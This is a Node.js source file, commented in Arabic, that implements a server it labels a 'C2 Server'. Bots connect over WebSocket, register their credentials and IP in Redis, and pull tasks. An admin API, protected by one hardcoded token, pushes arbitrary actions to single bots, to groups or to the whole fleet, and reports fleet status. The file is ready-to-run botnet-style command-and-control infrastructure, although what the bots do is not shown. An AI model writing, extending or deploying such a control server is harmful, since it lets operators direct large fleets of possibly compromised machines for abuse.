const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const Redis = require('ioredis');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

// ====== CONFIG ======
const PORT = 3000;
const REDIS_URL = 'redis://localhost:6379';
const AUTH_TOKEN = 'your-master-admin-token-here'; // غير دا لحاجة قوية

// ====== INIT ======
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: '/ws' });
const redis = new Redis(REDIS_URL);

app.use(express.json());

// Rate limiting لل API
const apiLimiter = rateLimit({
    windowMs: 1000,
    max: 10,
    message: { error: 'Too many requests' }
});
app.use('/api/', apiLimiter);

// ====== WEB SOCKET — البوتات تتصل هنا ======
wss.on('connection', async (ws, req) => {
    const clientIp = req.socket.remoteAddress;
    let botId = null;

    ws.on('message', async (data) => {
        try {
            const msg = JSON.parse(data);
            
            switch(msg.type) {
                case 'auth': {
                    // البوت يرسل ID و password حقته
                    const { id, password } = msg;
                    botId = `bot:${id}`;
                    
                    // حفظ البوت في Redis
                    await redis.hmset(botId, {
                        id,
                        password,
                        ip: clientIp,
                        status: 'idle',
                        lastSeen: Date.now(),
                        wsConnected: 'true'
                    });
                    await redis.sadd('bots:all', botId);
                    
                    ws.send(JSON.stringify({ type: 'auth_ok', id }));
                    console.log(`✅ Bot connected: ${id}`);
                    
                    // شوف لو فيه مهمة معلقة للبوت دا
                    const pendingTask = await redis.lpop(`tasks:${id}`);
                    if (pendingTask) {
                        ws.send(pendingTask);
                    }
                    break;
                }
                
                case 'report': {
                    const { status, message, taskId } = msg;
                    await redis.hmset(botId, { 
                        status, 
                        lastMessage: message,
                        lastSeen: Date.now()
                    });
                    
                    // سجل التقرير
                    await redis.lpush(`logs:${botId}`, JSON.stringify({
                        time: Date.now(),
                        status,
                        message,
                        taskId
                    }));
                    await redis.ltrim(`logs:${botId}`, 0, 99); // آخر 100 log
                    
                    // البوت جاهز لمهمة جديدة
                    if (status === 'done' || status === 'failed') {
                        const nextTask = await redis.lpop(`tasks:${botId}`);
                        if (nextTask) {
                            ws.send(nextTask);
                        } else {
                            ws.send(JSON.stringify({ type: 'idle' }));
                        }
                    }
                    break;
                }
                
                case 'ready': {
                    // البوت جاهز → دور له مهمة
                    const task = await redis.lpop(`tasks:${botId}`);
                    if (task) {
                        ws.send(task);
                    } else {
                        // مهمة عامة لجميع البوتات
                        const globalTask = await redis.lpop('tasks:global');
                        if (globalTask) {
                            ws.send(globalTask);
                        } else {
                            ws.send(JSON.stringify({ type: 'idle' }));
                        }
                    }
                    break;
                }
                
                case 'ping': {
                    ws.send(JSON.stringify({ type: 'pong' }));
                    break;
                }
            }
        } catch (err) {
            console.error(`WS Error from ${botId}:`, err.message);
        }
    });

    ws.on('close', () => {
        if (botId) {
            redis.hmset(botId, { 
                status: 'offline', 
                wsConnected: 'false',
                lastSeen: Date.now()
            });
            console.log(`❌ Bot disconnected: ${botId}`);
        }
    });
});

// ====== REST API — لوحة التحكم تتصل هنا ======

// التحقق من صلاحية الـ Admin
function requireAdmin(req, res, next) {
    const token = req.headers['authorization'];
    if (token !== `Bearer ${AUTH_TOKEN}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
}

// إرسال مهمة لبوت واحد
app.post('/api/task/single', requireAdmin, async (req, res) => {
    const { botId, actions } = req.body;
    if (!botId || !actions) {
        return res.status(400).json({ error: 'botId and actions required' });
    }
    
    const task = JSON.stringify({ 
        type: 'task', 
        id: crypto.randomUUID(),
        actions,
        createdAt: Date.now()
    });
    
    // ضيف المهمة للبوت
    await redis.rpush(`tasks:${botId}`, task);
    
    // لو البوت متصل، ابعتله المهمة فوراً
    const wsConnected = await redis.hget(`bot:${botId}`, 'wsConnected');
    if (wsConnected === 'true') {
        // محتاج نشوف لو البوت connected على الـ WebSocket دلوقتي
        // دا يتطلب hash map بين botId و ws connection
    }
    
    res.json({ success: true, message: `Task queued for ${botId}` });
});

// إرسال مهمة لجميع البوتات
app.post('/api/task/broadcast', requireAdmin, async (req, res) => {
    const { actions } = req.body;
    if (!actions) {
        return res.status(400).json({ error: 'actions required' });
    }
    
    const task = JSON.stringify({ 
        type: 'task', 
        id: crypto.randomUUID(),
        actions,
        createdAt: Date.now(),
        broadcast: true
    });
    
    // ضيف المهمة في قائمة global
    await redis.rpush('tasks:global', task);
    
    const botCount = await redis.scard('bots:all');
    res.json({ 
        success: true, 
        message: `Task queued for all bots`,
        botsTargeted: botCount
    });
});

// إرسال مهمة لمجموعة بوتات معينة
app.post('/api/task/group', requireAdmin, async (req, res) => {
    const { group, actions } = req.body;
    if (!group || !actions) {
        return res.status(400).json({ error: 'group and actions required' });
    }
    
    const task = JSON.stringify({ 
        type: 'task', 
        id: crypto.randomUUID(),
        actions,
        createdAt: Date.now()
    });
    
    // ضيف المهمة لكل بوت في المجموعة
    const members = await redis.smembers(`group:${group}`);
    for (const botId of members) {
        await redis.rpush(`tasks:${botId}`, task);
    }
    
    res.json({ 
        success: true, 
        message: `Task queued for group ${group}`,
        botsTargeted: members.length
    });
});

// إنشاء مجموعة بوتات
app.post('/api/group/create', requireAdmin, async (req, res) => {
    const { group, bots } = req.body;
    if (!group || !bots || !Array.isArray(bots)) {
        return res.status(400).json({ error: 'group and bots array required' });
    }
    
    await redis.del(`group:${group}`);
    for (const botId of bots) {
        await redis.sadd(`group:${group}`, botId);
    }
    
    res.json({ success: true, message: `Group ${group} created with ${bots.length} bots` });
});

// إيقاف جميع البوتات
app.post('/api/stop/all', requireAdmin, async (req, res) => {
    // ضيف أمر إيقاف في قائمة global
    const stopTask = JSON.stringify({ type: 'stop', id: crypto.randomUUID() });
    await redis.rpush('tasks:global', stopTask);
    
    // امسح كل المهام المعلقة
    const botIds = await redis.smembers('bots:all');
    for (const botId of botIds) {
        await redis.del(`tasks:${botId}`);
    }
    await redis.del('tasks:global');
    
    res.json({ success: true, message: 'All bots stopped' });
});

// Dashboard stats
app.get('/api/dashboard', requireAdmin, async (req, res) => {
    const botIds = await redis.smembers('bots:all');
    let total = botIds.length;
    let idle = 0, working = 0, done = 0, failed = 0, offline = 0;
    let botsData = [];
    
    for (const botId of botIds) {
        const data = await redis.hgetall(botId);
        if (data) {
            botsData.push(data);
            switch(data.status) {
                case 'idle': idle++; break;
                case 'working': working++; break;
                case 'done': done++; break;
                case 'failed': failed++; break;
                case 'offline': offline++; break;
            }
        }
    }
    
    res.json({
        total,
        idle,
        working,
        done,
        failed,
        offline,
        bots: botsData.slice(-100) // آخر 100 بوت
    });
});

// ====== STATIC FILES للوحة التحكم ======
app.use(express.static('public'));

// ====== START ======
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 C2 Server running on http://0.0.0.0:${PORT}`);
    console.log(`📡 WebSocket on ws://0.0.0.0:${PORT}/ws`);
});